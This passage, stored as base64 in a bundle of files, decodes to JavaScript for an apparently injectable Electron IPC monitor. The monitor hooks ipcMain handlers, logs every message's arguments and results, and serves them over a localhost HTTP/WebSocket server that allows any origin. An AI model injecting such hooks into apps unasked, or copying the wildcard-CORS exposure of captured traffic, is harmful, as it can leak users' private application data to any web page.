cCA9IHJlcXVpcmUoJ2h0dHAnKTsKICAgICAgICAgICAgY29uc3QgY3J5cHRvID0gcmVxdWlyZSgnY3J5cHRvJyk7CiAgICAgICAgICAgIGNvbnN0IGNsaWVudHMgPSBuZXcgU2V0KCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcigocmVxLCByZXMpID0+IHsKICAgICAgICAgICAgICAgIC8vIEhhbmRsZSByZWd1bGFyIEhUVFAgcmVxdWVzdHMKICAgICAgICAgICAgICAgIHJlcy5zZXRIZWFkZXIoJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbicsICcqJyk7CiAgICAgICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1NZXRob2RzJywgJ0dFVCwgUE9TVCwgT1BUSU9OUycpOwogICAgICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKHJlcS5tZXRob2QgPT09ICdPUFRJT05TJykgewogICAgICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoMjAwKTsKICAgICAgICAgICAgICAgICAgICByZXMuZW5kKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBTZW5kIHJlY2VudCBJUEMgdHJhZmZpYyBhcyBKU09OCiAgICAgICAgICAgICAgICBjb25zdCByZWNlbnRUcmFmZmljID0gaXBjVHJhZmZpYy5zbGljZSgtMTAwKTsgLy8gTGFzdCAxMDAgbWVzc2FnZXMKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSBzYWZlU3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnaXBjLXRyYWZmaWMnLAogICAgICAgICAgICAgICAgICAgIGRhdGE6IHJlY2VudFRyYWZmaWMsCiAgICAgICAgICAgICAgICAgICAgdG90YWw6IGlwY1RyYWZmaWMubGVuZ3RoCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICAgICAgcmVzLmVuZChtZXNzYWdlKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBIYW5kbGUgV2ViU29ja2V0IHVwZ3JhZGUKICAgICAgICAgICAgc2VydmVyLm9uKCd1cGdyYWRlJywgKHJlcXVlc3QsIHNvY2tldCwgaGVhZCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OSVRPUl0gV2ViU29ja2V0IHVwZ3JhZGUgcmVxdWVzdGVkJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IHJlcXVlc3QuaGVhZGVyc1snc2VjLXdlYnNvY2tldC1rZXknXTsKICAgICAgICAgICAgICAgIGlmICgha2V5KSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0LmVuZCgnSFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0XHJcblxyXG4nKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdlbmVyYXRlIFdlYlNvY2tldCBhY2NlcHQga2V5CiAgICAgICAgICAgICAgICBjb25zdCBhY2NlcHRLZXkgPSBjcnlwdG8KICAgICAgICAgICAgICAgICAgICAuY3JlYXRlSGFzaCgnc2hhMScpCiAgICAgICAgICAgICAgICAgICAgLnVwZGF0ZShrZXkgKyAnMjU4RUFGQTUtRTkxNC00N0RBLTk1Q0EtQzVBQjBEQzg1QjExJykKICAgICAgICAgICAgICAgICAgICAuZGlnZXN0KCdiYXNlNjQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU2VuZCBXZWJTb2NrZXQgaGFuZHNoYWtlIHJlc3BvbnNlCiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZUhlYWRlcnMgPSBbCiAgICAgICAgICAgICAgICAgICAgJ0hUVFAvMS4xIDEwMSBTd2l0Y2hpbmcgUHJvdG9jb2xzJywKICAgICAgICAgICAgICAgICAgICAnVXBncmFkZTogd2Vic29ja2V0JywKICAgICAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbjogVXBncmFkZScsCiAgICAgICAgICAgICAgICAgICAgYFNlYy1XZWJTb2NrZXQtQWNjZXB0OiAke2FjY2VwdEtleX1gLAogICAgICAgICAgICAgICAgICAgICcnLCAnJwogICAgICAgICAgICAgICAgXS5qb2luKCdcclxuJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC53cml0ZShyZXNwb25zZUhlYWRlcnMpOwogICAgICAgICAgICAgICAgY2xpZW50cy5hZGQoc29ja2V0KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OSVRPUl0gV2ViU29ja2V0IGNsaWVudCBjb25uZWN0ZWQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU2VuZCByZWNlbnQgSVBDIHRyYWZmaWMgaW1tZWRpYXRlbHkKICAgICAgICAgICAgICAgIGlmIChpcGNUcmFmZmljLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCByZWNlbnRUcmFmZmljID0gaXBjVHJhZmZpYy5zbGljZSgtNTApOyAvLyBMYXN0IDUwIG1lc3NhZ2VzCiAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBzYWZlU3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogJ2lwYy10cmFmZmljJywKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogcmVjZW50VHJhZmZpYywKICAgICAgICAgICAgICAgICAgICAgICAgdG90YWw6IGlwY1RyYWZmaWMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzb2NrZXQub24oJ2Nsb3NlJywgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSVBDLU1PTklUT1JdIFdlYlNvY2tldCBjbGllbnQgZGlzY29ubmVjdGVkJyk7CiAgICAgICAgICAgICAgICAgICAgY2xpZW50cy5kZWxldGUoc29ja2V0KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzb2NrZXQub24oJ2Vycm9yJywgKGVycikgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OSVRPUl0gV2ViU29ja2V0IGNsaWVudCBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICAgICAgICAgIGNsaWVudHMuZGVsZXRlKHNvY2tldCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBGdW5jdGlvbiB0byBzZW5kIFdlYlNvY2tldCBtZXNzYWdlCiAgICAgICAgICAgIGZ1bmN0aW9uIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgbWVzc2FnZSkgewogICAgICAgICAgICAgICAgY29uc3QgYnVmZmVyID0gQnVmZmVyLmZyb20obWVzc2FnZSwgJ3V0ZjgnKTsKICAgICAgICAgICAgICAgIGNvbnN0IGZyYW1lTGVuZ3RoID0gYnVmZmVyLmxlbmd0aDsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGV0IGZyYW1lOwogICAgICAgICAgICAgICAgaWYgKGZyYW1lTGVuZ3RoIDwgMTI2KSB7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUgPSBCdWZmZXIuYWxsb2MoZnJhbWVMZW5ndGggKyAyKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IGZyYW1lTGVuZ3RoOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAyKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZnJhbWVMZW5ndGggPCA2NTUzNikgewogICAgICAgICAgICAgICAgICAgIGZyYW1lID0gQnVmZmVyLmFsbG9jKGZyYW1lTGVuZ3RoICsgNCk7CiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMF0gPSAweDgxOyAvLyBUZXh0IGZyYW1lCiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMV0gPSAxMjY7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUud3JpdGVVSW50MTZCRShmcmFtZUxlbmd0aCwgMik7CiAgICAgICAgICAgICAgICAgICAgYnVmZmVyLmNvcHkoZnJhbWUsIDQpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBmcmFtZSA9IEJ1ZmZlci5hbGxvYyhmcmFtZUxlbmd0aCArIDEwKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IDEyNzsKICAgICAgICAgICAgICAgICAgICBmcmFtZS53cml0ZVVJbnQzMkJFKDAsIDIpOwogICAgICAgICAgICAgICAgICAgIGZyYW1lLndyaXRlVUludDMyQkUoZnJhbWVMZW5ndGgsIDYpOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAxMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0LndyaXRlKGZyYW1lKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OSVRPUl0gRXJyb3Igc2VuZGluZyBXZWJTb2NrZXQgbWVzc2FnZTonLCBlcnIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBGdW5jdGlvbiB0byBicm9hZGNhc3QgdG8gYWxsIFdlYlNvY2tldCBjbGllbnRzCiAgICAgICAgICAgIGZ1bmN0aW9uIGJyb2FkY2FzdElQQ1RyYWZmaWMoZGF0YSkgewogICAgICAgICAgICAgICAgY29uc3QgbWVzc2FnZSA9IHNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIHR5cGU6ICdpcGMtbWVzc2FnZScsCiAgICAgICAgICAgICAgICAgICAgZGF0YTogZGF0YQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsaWVudHMuZm9yRWFjaChjbGllbnQgPT4gewogICAgICAgICAgICAgICAgICAgIGlmICghY2xpZW50LmRlc3Ryb3llZCkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShjbGllbnQsIG1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudHMuZGVsZXRlKGNsaWVudCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbSVBDLU1PTklUT1JdIEJyb2FkY2FzdCBJUEMgbWVzc2FnZSB0byAke2NsaWVudHMuc2l6ZX0gY2xpZW50KHMpOiAke2RhdGEuY2hhbm5lbH1gKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU3RvcmUgYnJvYWRjYXN0IGZ1bmN0aW9uIGdsb2JhbGx5CiAgICAgICAgICAgIGdsb2JhbC5fYnJvYWRjYXN0SVBDVHJhZmZpYyA9IGJyb2FkY2FzdElQQ1RyYWZmaWM7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIubGlzdGVuKFBPUlQsICcxMjcuMC4wLjEnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgW0lQQy1NT05JVE9SXSDinJMgSFRUUC9XZWJTb2NrZXQgc2VydmVyIGxpc3RlbmluZyBvbiBwb3J0ICR7UE9SVH1gKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIub24oJ2Vycm9yJywgKGVycikgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0lQQy1NT05JVE9SXSBTZXJ2ZXIgZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gc2VydmVyOwogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTklUT1JdIEZhaWxlZCB0byBjcmVhdGUgSFRUUCBzZXJ2ZXI6JywgZXJyKTsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBMb2cgSVBDIHRyYWZmaWMKICAgIGZ1bmN0aW9uIGxvZ0lQQ1RyYWZmaWMoZGF0YSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIC8vIEFkZCB0byBpbnRlcm5hbCBidWZmZXIKICAgICAgICAgICAgaXBjVHJhZmZpYy5wdXNoKGRhdGEpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gS2VlcCBvbmx5IGxhc3QgMTAwMCBtZXNzYWdlcyB0byBwcmV2ZW50IG1lbW9yeSBpc3N1ZXMKICAgICAgICAgICAgaWYgKGlwY1RyYWZmaWMubGVuZ3RoID4gMTAwMCkgewogICAgICAgICAgICAgICAgaXBjVHJhZmZpYyA9IGlwY1RyYWZmaWMuc2xpY2UoLTEwMDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBCcm9hZGNhc3QgdG8gV2ViU29ja2V0IGNsaWVudHMKICAgICAgICAgICAgaWYgKGdsb2JhbC5fYnJvYWRjYXN0SVBDVHJhZmZpYykgewogICAgICAgICAgICAgICAgZ2xvYmFsLl9icm9hZGNhc3RJUENUcmFmZmljKGRhdGEpOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTklUT1JdIEVycm9yIGxvZ2dpbmcgSVBDIHRyYWZmaWM6JywgZS5tZXNzYWdlKTsKICAgICAgICB9CiAgICB9CiAgICAKICAgIC8vIFNldHVwIElQQyBob29rcwogICAgZnVuY3Rpb24gc2V0dXBJUENIb29rcygpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCB7IGlwY01haW4sIGFwcCB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIExvZyBzZXNzaW9uIHN0YXJ0CiAgICAgICAgICAgIGxvZ0lQQ1RyYWZmaWMoewogICAgICAgICAgICAgICAgdHlwZTogJ3Nlc3Npb25fc3RhcnQnLAogICAgICAgICAgICAgICAgcGlkOiBwcm9jZXNzLnBpZCwKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU3RvcmUgb3JpZ2luYWwgbWV0aG9kcwogICAgICAgICAgICBjb25zdCBvcmlnT24gPSBpcGNNYWluLm9uLmJpbmQoaXBjTWFpbik7CiAgICAgICAgICAgIGNvbnN0IG9yaWdIYW5kbGUgPSBpcGNNYWluLmhhbmRsZS5iaW5kKGlwY01haW4pOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gSG9vayBpcGNNYWluLm9uIHdpdGggc2FmZSBlcnJvciBoYW5kbGluZwogICAgICAgICAgICBpcGNNYWluLm9uID0gZnVuY3Rpb24oY2hhbm5lbCwgaGFuZGxlcikgewogICAgICAgICAgICAgICAgY29uc3Qgd3JhcHBlZEhhbmRsZXIgPSAoZXZlbnQsIC4uLmFyZ3MpID0+IHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBsb2dJUENUcmFmZmljKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdpcGNfb24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbm5lbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3M6IHNhZmVTZXJpYWxpemVBcmdzKGFyZ3MpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZGVyOiBldmVudC5zZW5kZXI/LmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBEb24ndCBsZXQgbG9nZ2luZyBlcnJvcnMgYnJlYWsgdGhlIGhhbmRsZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLy8gQ2FsbCBvcmlnaW5hbCBoYW5kbGVyIHdpdGggcHJvcGVyIGVycm9yIGhhbmRsaW5nCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGhhbmRsZXIoZXZlbnQsIC4uLmFyZ3MpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGhhbmRsZXJFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICBsb2dJUENUcmFmZmljKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdpcGNfaGFuZGxlcl9lcnJvcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGhhbmRsZXJFcnJvci5tZXNzYWdlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IGhhbmRsZXJFcnJvcjsgLy8gUmUtdGhyb3cgdG8gbWFpbnRhaW4gZXJyb3IgYmVoYXZpb3IKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ09uKGNoYW5uZWwsIHdyYXBwZWRIYW5kbGVyKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEhvb2sgaXBjTWFpbi5oYW5kbGUgd2l0aCBzYWZlIGVycm9yIGhhbmRsaW5nCiAgICAgICAgICAgIGlwY01haW4uaGFuZGxlID0gZnVuY3Rpb24oY2hhbm5lbCwgaGFuZGxlcikgewogICAgICAgICAgICAgICAgY29uc3Qgd3JhcHBlZEhhbmRsZXIgPSBhc3luYyAoZXZlbnQsIC4uLmFyZ3MpID0+IHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBsb2dJUENUcmFmZmljKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdpcGNfaGFuZGxlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW5uZWwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzOiBzYWZlU2VyaWFsaXplQXJncyhhcmdzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRlcjogZXZlbnQuc2VuZGVyPy5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gRG9uJ3QgbGV0IGxvZ2dpbmcgZXJyb3JzIGJyZWFrIHRoZSBoYW5kbGVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IGhhbmRsZXIoZXZlbnQsIC4uLmFyZ3MpOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLy8gTG9nIHJlc3VsdCBzYWZlbHkKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0lQQ1RyYWZmaWMoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdpcGNfcmVzdWx0JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdDogdHlwZW9mIHJlc3VsdCA9PT0gJ29iamVjdCcgPyAnW09iamVjdF0nIDogU3RyaW5nKHJlc3VsdCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBTaWxlbnQgbG9nIGZhaWx1cmUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChoYW5kbGVyRXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgbG9nSVBDVHJhZmZpYyh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnaXBjX2hhbmRsZV9lcnJvcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGhhbmRsZXJFcnJvci5tZXNzYWdlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IGhhbmRsZXJFcnJvcjsgLy8gUmUtdGhyb3cgdG8gbWFpbnRhaW4gZXJyb3IgYmVoYXZpb3IKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ0hhbmRsZShjaGFubmVsLCB3cmFwcGVkSGFuZGxlcik7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICBsb2dJUENUcmFmZmljKHsKICAgICAgICAgICAgICAgIHR5cGU6ICdob29rc19pbnN0YWxsZWQnLAogICAgICAgICAgICAgICAgbWVzc2FnZTogJ0lQQyBob29rcyBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5JywKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OSVRPUl0gSVBDIGhvb2tzIGluc3RhbGxlZCBzdWNjZXNzZnVsbHknKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoaG9va0Vycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OSVRPUl0gRXJyb3IgaW5zdGFsbGluZyBob29rczonLCBob29rRXJyb3IubWVzc2FnZSk7CiAgICAgICAgICAgIGxvZ0lQQ1RyYWZmaWMoewogICAgICAgICAgICAgICAgdHlwZTogJ2hvb2tfZXJyb3InLAogICAgICAgICAgICAgICAgZXJyb3I6IGhvb2tFcnJvci5tZXNzYWdlLAogICAgICAgICAgICAgICAgc3RhY2s6IGhvb2tFcnJvci5zdGFjaywKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgIH0KICAgIAogICAgLy8gQWRkIHByb2Nlc3MgZXJyb3IgaGFuZGxlcnMKICAgIGZ1bmN0aW9uIHNldHVwRXJyb3JIYW5kbGVycygpIHsKICAgICAgICBwcm9jZXNzLm9uKCd1bmNhdWdodEV4Y2VwdGlvbicsIChlcnJvcikgPT4gewogICAgICAgICAgICBsb2dJUENUcmFmZmljKHsKICAgICAgICAgICAgICAgIHR5cGU6ICd1bmNhdWdodF9leGNlcHRpb24nLAogICAgICAgICAgICAgICAgZXJyb3I6IGVycm9yLm1lc3NhZ2UsCiAgICAgICAgICAgICAgICBzdGFjazogZXJyb3Iuc3RhY2ssCiAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKQogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKICAgICAgICAKICAgICAgICBwcm9jZXNzLm9uKCd1bmhhbmRsZWRSZWplY3Rpb24nLCAocmVhc29uLCBwcm9taXNlKSA9PiB7CiAgICAgICAgICAgIGxvZ0lQQ1RyYWZmaWMoewogICAgICAgICAgICAgICAgdHlwZTogJ3VuaGFuZGxlZF9yZWplY3Rpb24nLAogICAgICAgICAgICAgICAgcmVhc29uOiBTdHJpbmcocmVhc29uKSwKICAgICAgICAgICAgICAgIHByb21pc2U6ICdbUHJvbWlzZV0nLAogICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9CiAgICAKICAgIC8vIEluaXRpYWxpemUgSVBDIG1vbml0b3IKICAgIGFzeW5jIGZ1bmN0aW9uIGluaXRpYWxpemUoKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OSVRPUl0gSW5pdGlhbGl6aW5nIElQQyB0cmFmZmljIG1vbml0b3IuLi4nKTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICAvLyBDcmVhdGUgc2VydmVyCiAgICAgICAgICAgIHNlcnZlciA9IGNyZWF0ZUhUVFBTZXJ2ZXIoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIFNldHVwIGVycm9yIGhhbmRsZXJzCiAgICAgICAgICAgIHNldHVwRXJyb3JIYW5kbGVycygpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU2V0dXAgSVBDIGhvb2tzCiAgICAgICAgICAgIGNvbnN0IHsgYXBwIH0gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgICAgICBpZiAoYXBwLmlzUmVhZHkoKSkgewogICAgICAgICAgICAgICAgc2V0dXBJUENIb29rcygpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgYXBwLndoZW5SZWFkeSgpLnRoZW4oc2V0dXBJUENIb29rcyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSVBDLU1PTklUT1JdID09PSBJTklUSUFMSVpBVElPTiBDT01QTEVURSA9PT0nKTsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtJUEMtTU9OSVRPUl0gU2VydmVyIHJ1bm5pbmcgb246IGh0dHA6Ly8xMjcuMC4wLjE6JHtQT1JUfWApOwogICAgICAgICAgICBjb25zb2xlLmxvZyhgW0lQQy1NT05JVE9SXSBXZWJTb2NrZXQgZW5kcG9pbnQ6IHdzOi8vMTI3LjAuMC4xOiR7UE9SVH1gKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OSVRPUl0gSW5pdGlhbGl6YXRpb24gZmFpbGVkOicsIGVycik7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBTdGFydCBpbW1lZGlhdGVseQogICAgaW5pdGlhbGl6ZSgpOwogICAgCn0pKCk7","ipc-mon.js":"IyEvdXNyL2Jpbi9lbnYgbm9kZQoKLy8gSVBDLU1PTiAtIExpZ2h0d2VpZ2h0IEVsZWN0cm9uIElQQyBUcmFmZmljIE1vbml0b3IKLy8gVmVyc2lvbiB3aXRob3V0IHRlbXBsYXRlIGxpdGVyYWxzIHRvIGF2b2lkIGluamVjdGlvbiBjb25mbGljdHMKCmNvbnNvbGUubG9nKCdbSVBD